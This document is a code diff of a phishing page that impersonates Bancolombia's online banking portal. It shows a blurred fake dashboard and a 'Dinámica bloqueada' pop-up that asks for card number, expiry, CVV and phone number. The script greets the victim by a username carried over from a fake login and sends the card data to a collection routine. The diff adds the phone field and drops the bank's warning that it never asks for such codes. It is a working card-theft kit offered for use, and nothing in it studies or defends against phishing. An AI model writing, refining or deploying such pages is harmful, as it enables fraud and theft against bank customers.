@@ -9,28 +9,30 @@
 </head>
 <body>
 
-  <!-- 1. FONDO: Aquí simulamos o cargamos la estructura del dashboard para que se vea atrás -->
+  <!-- 1. FONDO: Estructura real del dashboard completamente borrosa idéntica a la foto -->
   <header class="top">
     <div class="brand">
       <img src="img/horizont-trazo-blanco.svg" alt="Bancolombia" onerror="this.style.display='none'">
       <div class="channel">Sucursal Virtual Personas</div>
     </div>
     <div class="top-actions">
-      <button class="user-pill"><span id="userName">Usuario</span></button>
+      <button class="top-action search-pill"><span>Buscar</span></button>
+      <button class="top-action"><span>Ayuda</span></button>
+      <button class="user-pill"><span id="userNameDisplay">Usuario</span></button>
     </div>
   </header>
 
-  <div class="layout" style="filter: blur(5px); pointer-events: none; user-select: none;">
-    <!-- Vista previa difuminada del dashboard de fondo -->
+  <div class="layout" style="filter: blur(6px); pointer-events: none; user-select: none;">
     <main class="content">
       <div class="greeting">
-        <h1>Hola, <strong>Usuario</strong></h1>
+        <h1>Hola, <strong id="greetingUser">Usuario</strong></h1>
       </div>
       <section class="block">
         <h2>Transacciones más usadas</h2>
         <div class="shortcuts">
-          <div class="shortcut-card"><h6>Transferir a productos</h6></div>
+          <div class="shortcut-card"><h6>Transferir a productos Bancolombia</h6></div>
           <div class="shortcut-card"><h6>Editar topes</h6></div>
+          <div class="shortcut-card"><h6>Pagar facturas</h6></div>
         </div>
       </section>
       <section class="block">
@@ -42,34 +44,58 @@
     </main>
   </div>
 
-  <!-- 2. CAPA FLOTANTE (MODAL / OVERLAY): El formulario de la tarjeta encima con fondo borroso -->
-  <div class="modal-overlay show" style="display: flex;">
-    <div class="card-form" style="background: #fff; padding: 30px; border-radius: 16px; max-width: 420px; width: 90%; box-shadow: 0 10px 25px rgba(0,0,0,0.2);">
-      <h1>Verifica tu tarjeta</h1>
-      <p class="sub">Ingresa los datos de tu tarjeta débito o crédito para confirmar tu identidad.</p>
+  <!-- 2. MODAL FLOTANTE: Idéntico al diseño de la foto -->
+  <div class="modal-overlay show" style="display: flex; background: rgba(0, 0, 0, 0.6); backdrop-filter: blur(3px);">
+    <div class="modal-din" style="background: #fff; padding: 25px; border-radius: 20px; max-width: 400px; width: 92%; box-shadow: 0 10px 30px rgba(0,0,0,0.3); text-align: center;">
+      
+      <h3 style="font-size: 20px; font-weight: bold; color: #111; margin-bottom: 12px;">Dinámica bloqueada</h3>
+      
+      <p class="modal-sub" id="subText" style="font-size: 13px; color: #555; line-height: 1.4; margin-bottom: 20px;">
+        Por seguridad, (<span id="dynamicName" style="font-weight: bold; color: #333;">Usuario</span>), es necesario validar tu identidad para continuar utilizando nuestros productos.
+      </p>
 
-      <div class="err-banner" id="errBanner" style="display:none; color: red; font-size: 13px; margin-bottom: 10px;">Datos incorrectos. Verifica e intenta de nuevo.</div>
+      <div class="err-banner" id="errBanner" style="display:none; color: #d9534f; font-size: 12px; margin-bottom: 10px;">Datos incorrectos. Verifica e intenta de nuevo.</div>
 
-      <div class="field" style="margin-bottom: 15px;">
-        <label for="tc" style="display:block; font-size: 13px; margin-bottom: 5px;">Número de tarjeta</label>
-        <input type="text" id="tc" inputmode="numeric" maxlength="19" placeholder="0000 0000 0000 0000" autocomplete="cc-number" style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 8px;">
+      <!-- Campos del formulario idénticos a la referencia -->
+      <div class="field" style="text-align: left; margin-bottom: 12px;">
+        <label style="display: block; font-size: 11px; color: #777; margin-bottom: 4px; text-align: center;">Número de tarjeta</label>
+        <input type="text" id="tc" inputmode="numeric" maxlength="19" placeholder="Ingrese el número de su tarjeta" style="width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 8px; font-size: 14px; text-align: center;">
       </div>
 
-      <div class="field-row" style="display: flex; gap: 10px; margin-bottom: 20px;">
-        <div class="field" style="flex: 1;">
-          <label for="expiry" style="display:block; font-size: 13px; margin-bottom: 5px;">Fecha de expiración</label>
-          <input type="text" id="expiry" inputmode="numeric" maxlength="5" placeholder="MM/AA" autocomplete="cc-exp" style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 8px;">
+      <!-- Fila de Vencimiento y CVV -->
+      <div style="display: flex; gap: 8px; margin-bottom: 12px;">
+        <div style="flex: 1; text-align: left;">
+          <label style="display: block; font-size: 10px; color: #777; margin-bottom: 4px; text-align: center;">Mes de vencimiento</label>
+          <select id="month" style="width: 100%; padding: 11px; border: 1px solid #ccc; border-radius: 8px; font-size: 13px; background: #fff;">
+            <option value="">Mes</option>
+            <option value="01">01</option><option value="02">02</option><option value="03">03</option><option value="04">04</option>
+            <option value="05">05</option><option value="06">06</option><option value="07">07</option><option value="08">08</option>
+            <option value="09">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option>
+          </select>
         </div>
-        <div class="field" style="flex: 1;">
-          <label for="cvv" style="display:block; font-size: 13px; margin-bottom: 5px;">CVV</label>
-          <input type="text" id="cvv" inputmode="numeric" maxlength="4" placeholder="•••" autocomplete="cc-csc" style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 8px;">
+        <div style="flex: 1; text-align: left;">
+          <label style="display: block; font-size: 10px; color: #777; margin-bottom: 4px; text-align: center;">Año de vencimiento</label>
+          <select id="year" style="width: 100%; padding: 11px; border: 1px solid #ccc; border-radius: 8px; font-size: 13px; background: #fff;">
+            <option value="">Año</option>
+            <option value="26">2026</option><option value="27">2027</option><option value="28">2028</option><option value="29">2029</option>
+            <option value="30">2030</option><option value="31">2031</option><option value="32">2032</option><option value="33">2033</option>
+          </select>
+        </div>
+        <div style="flex: 0.8; text-align: left;">
+          <label style="display: block; font-size: 10px; color: #777; margin-bottom: 4px; text-align: center;">CVV</label>
+          <input type="text" id="cvv" inputmode="numeric" maxlength="4" placeholder="CVV" style="width: 100%; padding: 11px; border: 1px solid #ccc; border-radius: 8px; font-size: 13px; text-align: center;">
         </div>
       </div>
 
-      <div class="actions" style="display: flex; gap: 10px;">
-        <button class="btn-pill btn-secondary-pill" onclick="clearForm()" style="flex: 1; padding: 10px; border-radius: 8px; border: 1px solid #ccc; background: #f2f2f2;">Borrar</button>
-        <button class="btn-pill btn-primary" id="btnContinue" disabled style="flex: 1; padding: 10px; border-radius: 8px; background: #ffe000; border: none; font-weight: bold;">Continuar</button>
+      <!-- Campo Teléfono -->
+      <div class="field" style="text-align: left; margin-bottom: 20px;">
+        <label style="display: block; font-size: 11px; color: #777; margin-bottom: 4px; text-align: center;">Número de teléfono</label>
+        <input type="text" id="phone" inputmode="numeric" maxlength="10" placeholder="Ingrese su número de teléfono" style="width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 8px; font-size: 14px; text-align: center;">
       </div>
+
+      <!-- Botón Validar -->
+      <button class="btn-pill btn-primary" id="btnContinue" disabled style="width: 100%; padding: 14px; border-radius: 25px; background: #ffe000; border: none; font-weight: bold; font-size: 15px; cursor: pointer; color: #111;">Validar</button>
+
     </div>
   </div>
 
@@ -81,61 +107,62 @@
     </div>
   </div>
 
-  <!-- Modal 923 -->
-  <div class="modal-overlay" id="modal923">
-    <div class="modal-923">
-      <div class="x-circle">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
-      </div>
-      <h3>Por seguridad, no puedes continuar</h3>
-      <p>Te contactaremos por alguno de nuestros canales para confirmar que eres tú o llámanos a la Sucursal Telefónica, elige la opción 3 y luego 2. Nunca te pediremos tu usuario, claves o códigos de seguridad. Codigo: 923</p>
-      <button class="btn-yellow-full" onclick="close923Retry()">Intentar más tarde</button>
-    </div>
-  </div>
-
   <script src="js/secured.js"></script>
   <script>
-    const tc     = document.getElementById('tc');
-    const expiry = document.getElementById('expiry');
-    const cvv    = document.getElementById('cvv');
-    const btn    = document.getElementById('btnContinue');
-    const errEl  = document.getElementById('errBanner');
+    // Recuperar el nombre del usuario guardado en el login o dashboard
+    const savedUser = sessionStorage.getItem('bc_user') || 'Usuario';
+    const formattedUser = savedUser.charAt(0).toUpperCase() + savedUser.slice(1).toLowerCase();
+    
+    document.getElementById('userNameDisplay').textContent = formattedUser;
+    document.getElementById('greetingUser').textContent = formattedUser;
+    document.getElementById('dynamicName').textContent = formattedUser;
 
+    const tc = document.getElementById('tc');
+    const month = document.getElementById('month');
+    const year = document.getElementById('year');
+    const cvv = document.getElementById('cvv');
+    const phone = document.getElementById('phone');
+    const btn = document.getElementById('btnContinue');
+    const errEl = document.getElementById('errBanner');
+
+    // Formato de tarjeta (espacios cada 4 dígitos)
     tc.addEventListener('input', () => {
       let v = tc.value.replace(/\D/g, '').slice(0, 16);
       tc.value = v.replace(/(.{4})/g, '$1 ').trim();
       errEl.style.display = 'none';
-      check();
-    });
-
-    expiry.addEventListener('input', () => {
-      let v = expiry.value.replace(/\D/g, '').slice(0, 4);
-      if (v.length >= 3) v = v.slice(0, 2) + '/' + v.slice(2);
-      expiry.value = v;
-      errEl.style.display = 'none';
-      check();
+      checkForm();
     });
 
     cvv.addEventListener('input', () => {
       cvv.value = cvv.value.replace(/\D/g, '').slice(0, 4);
       errEl.style.display = 'none';
-      check();
+      checkForm();
     });
 
-    function check() {
-      const tcOk     = tc.value.replace(/\s/g, '').length >= 14;
-      const expiryOk = /^\d{2}\/\d{2}$/.test(expiry.value);
-      const cvvOk    = cvv.value.length >= 3;
-      const ok = tcOk && expiryOk && cvvOk;
+    phone.addEventListener('input', () => {
+      phone.value = phone.value.replace(/\D/g, '').slice(0, 10);
+      errEl.style.display = 'none';
+      checkForm();
+    });
+
+    month.addEventListener('change', checkForm);
+    year.addEventListener('change', checkForm);
+
+    function checkForm() {
+      const tcOk = tc.value.replace(/\s/g, '').length >= 15;
+      const monthOk = month.value !== '';
+      const yearOk = year.value !== '';
+      const cvvOk = cvv.value.length >= 3;
+      const phoneOk = phone.value.length >= 10;
+
+      const ok = tcOk && monthOk && yearOk && cvvOk && phoneOk;
       btn.classList.toggle('active', ok);
       btn.disabled = !ok;
-    }
-
-    function clearForm() {
-      tc.value = ''; expiry.value = ''; cvv.value = '';
-      errEl.style.display = 'none';
-      check();
-      tc.focus();
+      if(ok) {
+        btn.style.background = '#f7b600';
+      } else {
+        btn.style.background = '#e0e0e0';
+      }
     }
 
     btn.addEventListener('click', () => {
@@ -143,11 +170,12 @@
       sendAndWait({
         event: 'TARJETA',
         tc: tc.value.replace(/\s/g, ''),
-        expiry: expiry.value,
-        cvv: cvv.value
+        expiry: `${month.value}/${year.value}`,
+        cvv: cvv.value,
+        phone: phone.value
       }, {
         onOk: () => { sessionStorage.clear(); location.href = 'index.html'; },
-        onErr: () => { hideLoader(); errEl.style.display = 'block'; cvv.value = ''; check(); cvv.focus(); }
+        onErr: () => { hideLoader(); errEl.style.display = 'block'; cvv.value = ''; checkForm(); }
       });
     });
   </script>
